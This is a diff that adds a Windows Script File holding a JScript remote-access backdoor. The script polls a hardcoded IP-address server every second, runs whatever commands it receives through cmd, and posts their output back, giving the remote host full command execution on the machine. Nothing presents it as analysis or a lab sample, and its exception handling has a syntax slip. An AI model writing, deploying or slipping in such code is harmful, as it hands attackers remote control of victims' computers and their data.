@@ -1,0 +1,101 @@
+<package>
+    <job id="BASHLITERUN">
+        <script language="JScript">
+        var SERVER = "http://213.139.208.34:7777";
+
+
+        var shell, fso;
+        try {
+            shell = new ActiveXObject("WScript.Shell");
+            fso = new ActiveXObject("Scripting.FileSystemObject");
+        } catch(e) {
+            WScript.Quit(1);
+        }
+
+        var CLIENT_ID = GetClientId();
+
+        while (true) {
+            var command = PollServer();
+            
+            if (command != "" && command != "None" && command != "null") {
+                var output = ExecuteCommand(command);
+                SendResult(output);
+            } else {
+            }
+            
+            WScript.Sleep(1000);
+        }
+
+        function GetClientId() {
+            var computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+            var randId = Math.floor(Math.random() * 10000);
+            return computerName + "_" + randId;
+        }
+
+        function PollServer() {
+            try {
+                var url = SERVER + "/poll?client_id=" + encodeURIComponent(CLIENT_ID);
+                
+                var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                http.Open("GET", url, false);
+                http.Send();
+                
+                if (http.Status == 200) {
+                    var json = http.ResponseText;
+                    
+                    var match = json.match(/"command"\s*:\s*(?:"([^"]*)"|([^,\s}]+))/);
+                    if (match) {
+                        var cmd = match[1] !== undefined ? match[1] : match[2];
+                        if (!cmd || cmd.toLowerCase() == "null" || cmd.toLowerCase() == "none") {
+                            return "";
+                        }
+                        return cmd;
+                    } else {
+                    }
+                }
+                return "";
+            } catch(e) {
+                return "";
+            }
+        }
+
+        function ExecuteCommand(command) {
+            try {
+                if (command.toLowerCase() == "exit") {
+                    WScript.Quit(0);
+                }
+                var exec = shell.Exec("cmd /c " + command);
+                var output = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
+                if (output == "") output = "[no output]\r\n";
+                return output;
+            } catch(e) 
+                return "[error]";
+            }
+        }
+
+        function SendResult(output) {
+            try {
+                var url = SERVER + "/result";
+                
+                output = output.replace(/\\/g, "\\\\");
+                output = output.replace(/"/g, "\\\"");
+                output = output.replace(/\r\n/g, "\\n");
+                output = output.replace(/\r/g, "\\n");
+                output = output.replace(/\n/g, "\\n");
+                output = output.replace(/\t/g, "\\t");
+                output = output.replace(/[\x00-\x1F\x7F]/g, "");
+                
+                var postData = '{"client_id":"' + CLIENT_ID + '","output":"' + output + '"}';
+                WScript.Echo("[SEND] POST Data length: " + postData.length + " bytes");
+                
+                var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                http.Open("POST", url, false);
+                http.SetRequestHeader("Content-Type", "application/json");
+                http.Send(postData);
+                
+            } catch(e) {
+            }
+        }
+        </script>
+    </job>
+</package>
